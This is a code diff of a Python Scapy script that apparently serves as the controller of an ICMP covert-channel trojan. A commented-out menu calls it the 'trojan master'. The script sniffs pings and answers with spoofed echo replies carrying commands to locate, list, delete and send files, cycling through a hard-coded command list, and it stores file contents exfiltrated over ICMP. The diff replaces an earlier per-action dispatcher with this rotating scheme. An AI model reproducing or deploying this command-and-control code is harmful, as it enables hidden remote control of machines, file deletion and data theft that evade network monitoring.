@@ -20,36 +20,6 @@ def stop_fnc(packet):
     else:
         return False
 
-
-"""def display_menu():
-    print("Bienvenu sur le trojan master : \n")
-    print("1. Testing connection")
-    print("2. Delete file")
-    print("3. list content of the path")
-    print("4. Locate file")
-    print("5. Quit!")
-    return int(input())"""
-def action_locate_file(pkt):
-    spoofed_pkt = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
-                  ICMP(type=0, code=0, id=500, seq=pkt[ICMP].seq) / \
-                  Raw(load="shadow")
-    send(spoofed_pkt, verbose=False)
-def action_list_directory(pkt):
-    spoofed_pkt = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
-                  ICMP(type=0, code=0, id=400, seq=pkt[ICMP].seq) / \
-                  Raw(load="./")
-    send(spoofed_pkt, verbose=False)
-def action_delete_file(pkt):
-    spoofed_pkt = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
-                  ICMP(type=0, code=0, id=300, seq=pkt[ICMP].seq) / \
-                  Raw(load="./data.txt")
-    send(spoofed_pkt, verbose=False)
-def action_send_file(pkt):
-    spoofed_pkt = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
-                  ICMP(type=0, code=0, id=200, seq=pkt[ICMP].seq) / \
-                  Raw(load="./data.txt")
-    send(spoofed_pkt, verbose=False)
-
 def storage_file(pkt,filename):
     message=""
     file = pkt[1:len(pkt) - 1]
@@ -65,73 +35,36 @@ def display_cmd(pkt):
         message += packet[ICMP].payload.load.decode("utf-8")
     print(message)
 
-def default_reply(pkt) :
+def forged_reply(pkt,action) :
  spoofed_pkt = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
               ICMP(type=0, code=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq)/\
-              Raw(load="alive")
+              Raw(load=action)
  send(spoofed_pkt, verbose=False)
 
+def default_reply(pkt):
+    spoofed_pkt = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
+                  ICMP(type=0, code=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq)
+    send(spoofed_pkt, verbose=False)
+
 def spoof_ping_reply(pkt):
+    action = ["500 data.txt", "400 ./", "300 ./data1.txt", "200 ./data.txt"]
+    if not hasattr(spoof_ping_reply, "cpt"):
+        spoof_ping_reply.cpt = 0
+    pkt[ICMP].id = 220
     if ICMP in pkt and pkt[ICMP].type == 8:
-        if pkt[ICMP].id == 210:
-            print(" Trojan ping request")
-            spoofed_pkt = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
-                          ICMP(type=0, code=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq) / \
-                          Raw(load="alive")
-            send(spoofed_pkt, verbose=False)
-
-        elif pkt[ICMP].id == 220:
-            print(" Start series of actions")
-            action_locate_file(pkt)
-            default_reply(pkt)
-
-        elif pkt[ICMP].id == 200:
-            print("Action 200 delete")
-            storage_file(pkt,"data.txt")
-            display_cmd(pkt)
-            default_reply(pkt)
-
-        elif pkt[ICMP].id == 300:
-            print("Action 300")
-            display_cmd(pkt)
-            default_reply(pkt)
-
-        elif pkt[ICMP].id == 400:
-            print("Action 400")
-            display_cmd(pkt)
-            default_reply(pkt)
-
-        elif pkt[ICMP].id == 500:
-            print("Action 500")
-            display_cmd(pkt)
-            default_reply(pkt)
+        if pkt[ICMP].id == 220:
+            print("Action")
+            forged_reply(pkt,action[spoof_ping_reply.cpt])
+            spoof_ping_reply.cpt= (spoof_ping_reply.cpt + 1) % len(action)
+            print(spoof_ping_reply.cpt)
 
         else:
             print("Normal ping request detected")
             default_reply(pkt)
 
 
-if __name__ == '__main__':
 
+if __name__ == '__main__':
+    print("Waiting ping")
     sniff(filter="icmp", prn=spoof_ping_reply)
 
-    """ message = ""
-    capture = receive_transmission()
-    capture = capture[1:len(capture) - 1]
-    for packet in capture:
-        message += packet[ICMP].payload.load.decode("utf-8")
-    print(message)
-    write_string_to_file("data.txt", message)"""
-
-
-    """while keep_going:
-        choice = display_menu()
-
-        choice = choix
-        if choice == 1:
-        elif choice == 2:
-        elif choice == 3:
-        elif choice == 4:
-        elif choice == 5:
-        else:
-            print("Wrong Choice!")"""
